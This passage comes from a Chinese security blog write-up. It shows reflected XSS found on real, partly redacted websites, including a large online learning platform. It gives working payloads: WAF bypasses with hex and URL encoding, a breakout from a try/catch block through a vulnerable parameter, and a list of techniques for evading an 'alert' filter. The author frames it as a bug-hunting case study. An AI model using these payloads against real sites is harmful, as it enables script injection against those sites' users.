+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;setTimeout%60al%5Cx65rt%5C%60X1ly?S%5C%60%60%2F%2F</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/jKxi6hU1raFyJ5e.png" alt="image-20250404065351456"></p>
+<p><img src="https://s2.loli.net/2025/04/04/xBrSIythj14FnCk.png"></p>
+<p>成功！</p>
+<blockquote>
+<p>javascript</p>
+</blockquote>
+<p><code>javascript</code>关键字也需要被十六进制编码，同理可得</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;location%5B%27href%27%5D%20%3D%20%27j%5Cx61vascript%3Aal%5Cx65rt%601%60%27//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/xBrSIythj14FnCk.png"></p>
+<h3 id="某全球最大的在线学习平台"><a href="#某全球最大的在线学习平台" class="headerlink" title="某全球最大的在线学习平台"></a>某全球最大的在线学习平台</h3><p>url是这样</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cxxxxxxx.com/cxxxxx/cxxxxxxxx.pl?cxxxx=vxxxx&amp;fxxx=Mxxxx&amp;jxxxx=txxxxx&amp;m=bxxxxx&amp;mod=pxxxx&amp;month=exxxxx&amp;pxxxx=uxxxx&amp;product_isbn_issn=xxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>上面介绍过的就不再重复，探测出来有回显的参数是<code>product_isbn_issn</code></p>
+<p>前端页面长这样子，对没错，就是一个空白的框框</p>
+<p><img src="https://s2.loli.net/2025/04/04/hySNbvcgV45fInA.png" alt="image-20250404071047531"></p>
+<p>抓包看看回显点所处的js代码结构</p>
+<p><img src="https://s2.loli.net/2025/04/04/S5tLTqz9RVriK4C.png" alt="image-20250404071642540"></p>
+<p>可以看到回显点在try-catch语句块里</p>
+<p>那么先构造闭合逃逸</p>
+<p><img src="https://s2.loli.net/2025/04/04/VymbMKPFnJZz3oS.png" alt="image-20250404145258448"></p>
+<p>逃逸成功</p>
+<p>直接尝试<code>alert</code>关键字</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS<span class="string">&#x27;);alert</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/QqsBYphERaUTCzO.png" alt="image-20250404150339818"></p>
+<p>发现竟然没有拦截，那么直接闭合后面的符号，不用注释了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS<span class="string">&#x27;);alert(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/36BKE9fAdNayWSh.png" alt="image-20250404150700741"></p>
+<p>卧槽？直接就闭合了？也没有任何拦截，这么快就秒了吗？</p>
+<p>看看浏览器响应，是否真的弹窗了？</p>
+<p><img src="https://s2.loli.net/2025/04/04/lB9N8FZKG2PrbYJ.png" alt="image-20250404151037989"></p>
+<p>果然没这么简单！奇怪，没有成功弹窗，看看控制台有什么报错吗难道？</p>
+<p><img src="https://s2.loli.net/2025/04/04/1IwYjWmv7NReZyU.png" alt="image-20250404151313715"></p>
+<p>果然有相关的报错，解释一下这个报错是什么意思</p>
+<p>这是一个<strong>框架访问错误</strong>：<br>错误信息显示<code>Cannot read properties of undefined (reading &#39;location&#39;)</code>，说明代码试图访问<code>window.parent.frames[&#39;banner&#39;]</code>时失败。可能原因有：父窗口中不存在名为’banner’的框架，或者由于同源策略限制，无法访问跨域的iframe内容</p>
+<p>为什么有这个报错会弹窗失败呢？看看此处的js代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">rexxxxx</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="keyword">var</span> raxxxxx=<span class="title class_">Mxxx</span>.<span class="title function_">fxxxx</span>(xxx);</span><br><span class="line">	   </span><br><span class="line">		<span class="keyword">try</span> &#123;	</span><br><span class="line">		<span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">frames</span>[<span class="string">&#x27;banner&#x27;</span>].<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;/cxxxxxxxxxxx/cxxxxxxxx.pl?fxxxxx=Mxxxxx&amp;product_isbn_issn=X1lyS&#x27;</span>);<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那是因为如果 <code>window.parent.frames[&#39;banner&#39;]</code> 访问失败，<code>try</code> 会捕获错误，但 <code>catch (e) &#123;&#125;</code> 直接忽略，导致你看不到错误。<code>alert(&#39;1&#39;)</code> <strong>不会执行</strong>，因为前面的代码已经报错，JS会停止执行</p>
+<p>那咋办？排查下这个报错为什么会产生呢，在浏览器控制台（F12）运行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">frames</span>[<span class="string">&#x27;banner&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>如果返回 <code>undefined</code>，说明没有这个 <code>frame</code></p>
+<p>如果返回 <code>null</code> 或报跨域错误，说明存在但无法访问</p>
+<p><img src="https://s2.loli.net/2025/04/04/n9xam3BUirLgIMP.png" alt="image-20250404153108853"></p>
+<p>好吧说明没有这个<code>frame</code> ，那咋办才能执行我们的弹窗代码捏？这个报错我们无法直接修复，修复不了它的下一行弹窗代码就不会被执行……</p>
+<p>既然这样，我们再逃逸一层试试呢，直接逃逸出来<code>try</code>语句，脱离这个报错的影响范围</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS<span class="string">&#x27;);&#125;alert(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/qPrZcm1CiSTXAkH.png" alt="image-20250404154051467"></p>
+<p>这样显然是不对的语法，还有一个<code>&#125;</code>未被正确闭合，于是我们得做大修改，把它们分成三个部分来闭合</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///这是第一个部分:rexxxxx()函数块，函数内部需要使用catch (e)闭合掉try语句，使得语法正确</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rexxxxx</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="keyword">var</span> raxxxxx=<span class="title class_">Mxxx</span>.<span class="title function_">fxxxx</span>(xxx);</span><br><span class="line">	   </span><br><span class="line">		<span class="keyword">try</span> &#123;	</span><br><span class="line">		<span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">frames</span>[<span class="string">&#x27;banner&#x27;</span>].<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;/cxxxxxxxxxxx/cxxxxxxxx.pl?fxxxxx=Mxxxxx&amp;product_isbn_issn=X1lyS&#x27;</span>);</span><br><span class="line"><span class="comment">///</span></span><br><span class="line">            </span><br><span class="line"><span class="comment">///这是第二部分，将用来写我们的弹窗代码逻辑                     </span></span><br><span class="line">            test<span class="string">&#x27;);            </span></span><br><span class="line"><span class="string">///</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">///这是第三部分，将使用try语句闭合掉catch语句，使得语法正确，然后还要正确闭合&#125;符号，于是需要在构造一个fuction来闭合，也就是外面再套一层函数块</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">		&#125; catch (e) &#123;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">///</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>理论成立，开始实战！</p>
+<p>闭合第一部分rexxxxx()函数块，以及函数块内部的try语句</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS<span class="string">&#x27;);&#125;catch(e)&#123;&#125;&#125;test</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/fFS7B9rHbnYGEt8.png" alt="image-20250404155129187"></p>
+<p>闭合成功！</p>
+<p>接着开始构造弹窗代码逻辑</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS<span class="string">&#x27;);&#125;catch(e)&#123;&#125;&#125;alert(1);</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/7GsJIYnf8CKXgjq.png" alt="image-20250404160259195"></p>
+<p>先这样写着占个位，继续闭合第三部分</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS<span class="string">&#x27;);&#125;catch(e)&#123;&#125;&#125;alert(1);function X()&#123;try&#123;//</span></span><br></pre></td></tr></table></figure>
+
+<p>url编个码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_isbn_issn=X1lyS%<span class="number">27</span>)%3B%7Dcatch(e)%7B%7D%7Dalert(<span class="string">&#x27;X1ly?S&#x27;</span>)%3Bfunction%20X()%7Btry%7B%2F%2F</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/S1fbPHv7Zmd9B4W.png" alt="image-20250404162941642"></p>
+<p>看看响应</p>
+<p><img src="https://s2.loli.net/2025/04/04/TLrKBYpGEvX34su.png" alt="image-20250404163146842"></p>
+<p>哟西！成功弹窗</p>
+<p>“主播主播，你的payload还是太不吃操作了，有没有更复杂的payload”</p>
+<p>“有的兄弟有的，这样更复杂的payload还有很多”</p>
+<p>假设<code>alert</code>被过滤，我们有很多种方式去绕过:</p>
+<ul>
+<li>eval嵌套base64编码</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(atob<span class="string">`YWxlcnQoJ1gxbHk/Uycp`</span>); </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="Reflect-apply-反射调用"><a href="#Reflect-apply-反射调用" class="headerlink" title="Reflect.apply 反射调用"></a><strong><code>Reflect.apply</code> 反射调用</strong></h3></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">apply</span>(<span class="variable language_">window</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>], <span class="literal">null</span>, [<span class="string">&#x27;X1ly?S&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="Object-defineProperty-动态定义"><a href="#Object-defineProperty-动态定义" class="headerlink" title="Object.defineProperty 动态定义"></a><strong><code>Object.defineProperty</code> 动态定义</strong></h3></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">window</span>, <span class="string">&#x27;a&#x27;</span>, &#123;<span class="attr">get</span>: <span class="function">() =&gt;</span> <span class="variable language_">window</span>[<span class="string">&#x27;ale&#x27;</span>+<span class="string">&#x27;rt&#x27;</span>]&#125;).<span class="title function_">a</span>(<span class="string">&#x27;X1ly?S&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="String-fromCharCode-拼接函数名"><a href="#String-fromCharCode-拼接函数名" class="headerlink" title="String.fromCharCode 拼接函数名"></a><strong><code>String.fromCharCode</code> 拼接函数名</strong></h3></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>[<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>)](<span class="string">&#x27;X1ly?S&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="沙盒绕过"><a href="#沙盒绕过" class="headerlink" title="&lt;iframe&gt; 沙盒绕过"></a><strong><code>&lt;iframe&gt;</code> 沙盒绕过</strong></h3></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> += <span class="string">&#x27;&lt;iframe src=&quot;javascript:al\u0065rt(\&#x27;X1ly?S\&#x27;)&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="Event-事件处理函数"><a href="#Event-事件处理函数" class="headerlink" title="Event 事件处理函数"></a><strong><code>Event</code> 事件处理函数</strong></h3></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(<span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="string">&#x27;al\x65rt(&quot;X1ly?S&quot;)&#x27;</span>], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/javascript&#x27;</span>&#125;)));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="Array-map-隐式调用"><a href="#Array-map-隐式调用" class="headerlink" title="Array.map 隐式调用"></a><strong><code>Array.map</code> 隐式调用</strong></h3></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;al&#x27;</span>].<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="variable language_">window</span>[x + <span class="string">&#x27;ert&#x27;</span>](<span class="string">&#x27;X1ly?S&#x27;</span>))[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<p>ok，文章到此结束，师傅们下次再见~，欢迎留言下次写什么文章呢？</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://x1lys.github.io">X1ly?S</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://x1lys.github.io/2025/04/13/%E7%BB%95WAF%E8%BF%9E%E6%96%A9%E4%B8%A4%E6%9E%9A%E6%B5%B7%E5%A4%96XSS/">https://x1lys.github.io/2025/04/13/绕WAF连斩两枚海外XSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://x1lys.github.io" target="_blank">X1ly?S</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B/">渗透案例</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>技术交流，互相学习</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wpa.qq.com/msgrd?v=3&amp;uin=2382247834&amp;site=qq&amp;menu=yes" target="_blank"><img class="post-qr-code-img" src="/img/52.jpg" alt="联系我"/></a><div class="post-qr-code-desc">联系我</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/29/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83/" title="Memcached未授权漏洞"><img class="cover" src="/img/1.jpg" onerror="onerror=null;src='/img/18.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Memcached未授权漏洞</div></div><div class="info-2"><div class="info-item-1">Memcached简介Memcached 是一个开源的、高性能的分布式内存缓存系统，主要用于加速动态Web应用程序（如数据库驱动网站）的响应速度。它通过将数据存储在内存中，减少对后端数据库的直接访问，从而显著提升数据读取速度。 核心特性 基于内存存储 数据存储在内存中，读写速度极快（微秒级响应）。 适合缓存临时性数据（如会话、热点数据）。   键值（Key-Value）存储 数据以简单的键值对形式存储（如 key: &quot;user_123&quot;, value: &quot;&#123;name: &#39;Alice&#39;, age: 30&#125;&quot;）。 键最大250字节，值默认最大1MB（可配置）。    典型应用场景 数据库查询缓存：缓存频繁访问的SQL结果。 会话存储（Session...</div></div></div></a><a class="pagination-related" href="/2025/04/13/%E8%8F%A0%E8%8F%9C%E6%B8%97%E9%80%8F%E5%B0%8F%E9%80%9A%E6%9D%80%E6%A1%88%E4%BE%8B/" title="菠菜？那很坏了！菠菜渗透小通杀案例"><img class="cover" src="/img/1.jpg" onerror="onerror=null;src='/img/18.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">菠菜？那很坏了！菠菜渗透小通杀案例</div></div><div class="info-2"><div class="info-item-1">前言公众号的粉丝、一位大师傅发来一个站，问我有没有兴趣试试，我点开一看，哇靠，这不是菠菜嘛，太坏了，必须渗透一下，于是有了这篇小通杀案例  初见端倪简单看了看各个功能点，大部分是一些静态展示内容，有少量的查询数据的功能，于是首先想到打SQL注入 直接来到一处查询功能点  输入admin，有数据正常回显  输入admin’，没有数据回显  抓个包看看  好家伙，狗运来了挡都挡不住，直接SQL报错了 经过手工测试发现没有waf，直接sqlmap跑可以了撒  到此，可以直接拿到整个数据库的全部数据，可以拿到后台管理员表，几个密码哈希值，5K+的姓名，会员号，银行卡号，初始密码，取款密码，资金流水等等数据   但是还不够，于是我进一步尝试getshell 经过漫长的测试发现：  目标是MySQL数据库 通过TP框架报错信息得到了网站根目录绝对路径 没有使用站库分离架构 目录没有写入文件权限 能够通过sqlmap获取sql-shell，但是数据库权限很低，只能执行一些有限的当前数据库的数据查询  对于MySQL，无非就两种常用的方式getshell，into...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/13/%E4%B8%8D%E6%98%AF%E5%93%A5%E4%BB%AC%E5%8C%97%E5%A4%A7%E8%A2%ABRCE%E4%BA%86/" title="不是哥们？北大被&quot;RCE&quot;了"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-13</div><div class="info-item-2">不是哥们？北大被&quot;RCE&quot;了</div></div><div class="info-2"><div class="info-item-1">前言团队的师傅突然发来一句，”要RCE北大了”，还配上了一个截图，是执行了ls /的全回显结果，卧槽，我直呼牛逼，当时就兴奋了，于是我那天晚上忙(耍)完也去对北大做了信息收集，想去找找看这位师傅所说的可以RCE的站点，后面确实被”RCE”了，觉得有点意思，于是有了这篇文章。 信息收集就不说了，收集下来几千条资产。根据那位师傅的描述，他说那个系统就是类似于”PTA”在线编程系统的，于是结合这个信息，对子域名进行了简单的排查，推测并快速定位到了某一个系统，点开一看，就是在线做一些编程题目的，那么八九不离十就是这个系统了  哟西，可以注册，黑客狂喜(bushi)，注册一个测试账号 直接来到题目做题，因为这里做编程题，不就是能执行我们编写的代码嘛？根据那位师傅的截图，推测肯定是这里编写程序时可以执行系统命令导致的”RCE”  选一个最简单的经典hello word   预期的是这样子，输出一个”hello...</div></div></div></a><a class="pagination-related" href="/2024/08/20/%E4%BB%8EJS%E6%8E%A5%E5%8F%A3%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%A4%A7%E9%87%8F%E5%AD%A6%E6%A0%A1%E7%9A%84%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/" title="从JS接口到拿下大量学校的超级管理员权限"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-20</div><div class="info-item-2">从JS接口到拿下大量学校的超级管理员权限</div></div><div class="info-2"><div class="info-item-1">信息收集首先通过网站标题搞清楚了网站的性质，是一个某地的站群系统，集合管理着大量的子网站  通过Wappalyzer了解使用的重点技术有：Java、Swagger-UI、Spring、Vue.js、Webpack 而常用的前后端分离架构正是Vue.js + Java(SpringBoot) 于是可以初步判断该站点是前后端分离架构的 而前后端分离的架构，常涉及到前后端之间的数据的传递与调用，如果接口鉴权未做好，很容易出现API接口未授权的安全漏洞 基本测试流程简单的信息收集之后，接下来开始走一遍登录框的基本测试流程 万能密码 弱口令 用户名枚举...</div></div></div></a><a class="pagination-related" href="/2025/01/10/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%B0%E4%B8%8A%E7%BA%BFCS/" title="从任意文件读取到上线CS"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-10</div><div class="info-item-2">从任意文件读取到上线CS</div></div><div class="info-2"><div class="info-item-1">前言记录一次稍微有点崎岖的渗透实战，看我如果从任意文件读取到上线CS 渗透过程信息收集一顿信息收集后，终于找到了这样一个资产，熟悉的师傅可能一眼就看出来了，这是fastadmin，对！没错，当我看到这个fastadmin的时候，就有预感要出货了……  先是试了一下弱口令，因为fastadmin中管理员忘记密码时，会去数据库中手动重置密码，默认重置的密码一般都是123456 尝试了admin 123456不行，接下来干嘛呢？ 肯定不是按照常规的思路去测什么登录框SQL注入，js里的未授权接口等等，因为这个是一个fastadmin框架啊，这种肯定是直接打Nday最有效撒，于是我们去收集一下fastadmin都有哪些Nday？   fastadmin Nday列举  下面简单列举一下几个Nday，不作详细解释，附上文章链接 任意文件读取 https://cloud.tencent.com/developer/article/2432376  可以读取数据库配置信息，可用来连接数据库 1GET...</div></div></div></a><a class="pagination-related" href="/2025/05/12/%E4%BB%8E%E7%99%BB%E5%BD%95%E5%B0%81%E9%94%81%E5%88%B0%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91%E6%B2%A6%E9%99%B7%E6%95%B4%E4%B8%AAC%E6%AE%B5/" title="从登录封锁到打穿内网沦陷整个C段"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">从登录封锁到打穿内网沦陷整个C段</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2024/05/04/%E6%84%8F%E5%A4%96%E5%8F%91%E7%8E%B0CVE-XSS%E3%80%81%E6%8C%82%E9%BB%91%E9%A1%B5%E3%80%81%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" title="意外发现CVE-XSS、挂黑页、文件删除"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-04</div><div class="info-item-2">意外发现CVE-XSS、挂黑页、文件删除</div></div><div class="info-2"><div class="info-item-1"> 前言：水一篇文章……没有什么价值与技术含量，望各位大佬轻喷。挖掘EDU时，偶然搜集到学校老师的个人网站，是一个文件共享系统，但是可惜该文件共享服系统与学校业务无关，是一些个人的工作、生活文件和一些源码压缩包。存在一些漏洞：反射型xss，存储型xss，文件上传html-挂黑页，文件删除，但是没有任何用哈哈，个人网站不算重要资产(除非涉及企业敏感信息)，影响几乎忽略不计。但是凭借这个文件系统的指纹，如果找到一些存有重要文件的该系统，那不就可以中危、高危提交了吗？  造成漏洞的主要原因其实没啥，全凭运气。那就是该文件共享系统被设置成了，允许访客执行所有操作！是的，不用登录，就有权限执行所有操作！归类的话，就算是权限、访问控制不当。因为本来安全的配置是只能允许访客下载文件的。 于是导致了： 漏洞复现任意文件删除 文件上传html钓鱼 挂黑页 存储型XSS...</div></div></div></a><a class="pagination-related" href="/2024/06/10/%E6%9F%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E5%A4%84%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E/" title="某网络安全培训机构的教学平台修改密码处存在逻辑缺陷漏洞"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-10</div><div class="info-item-2">某网络安全培训机构的教学平台修改密码处存在逻辑缺陷漏洞</div></div><div class="info-2"><div class="info-item-1"> 前言：第一次遇到这么奇葩的漏洞，故想记录一下，可惜后面没有危害提升成功，只是一个低危（但其实没有什么危害哈哈，只是很奇葩，打破了我”看上去就做得特别好的网站或者做网安的网站不存在漏洞”的天真认知，哈哈），要是能CSRF绝对高危。因为刚出这个漏洞，厂商还未修复，不得不厚码。但是不影响看思路（其实也没有啥思路可言），目标是一家有些名气的某网络安全培训机构的教学平台  漏洞URLhttps://xxxx.yyyyyy.com/login （你还真点了啊【狗头保命】） 漏洞复现 登录一个测试账号    进入平台，来到 个人设置 –&gt; 修改密码处    看到需要填写原始密码 新密码 确认密码三项（最初我怎么发现这里有问题的呢？就是我把这三项都填相同的任意字符串时，发现提示：修改密码成功，于是我就笃定这里的代码肯定写得有问题！）   我当前正确的原始密码是：admin123，但是当我 “原始密码 新密码 确认密码”三项都填写：123456 时，返回了修改密码成功！！！     于是尝试使用密码：123456...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/47.jpg'" alt="avatar"/></div><div class="author-info-name">X1ly?S</div><div class="author-info-description">需要的不是掌声，而是没有哭声</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/x1lys" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2382247834@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=2382247834&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #00b7f1;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">更多优质技术文章，欢迎关注【The One安全】微信公众号</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E5%85%A8%E7%90%83%E9%A1%B6%E7%BA%A7%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%95%86"><span class="toc-number">2.1.</span> <span 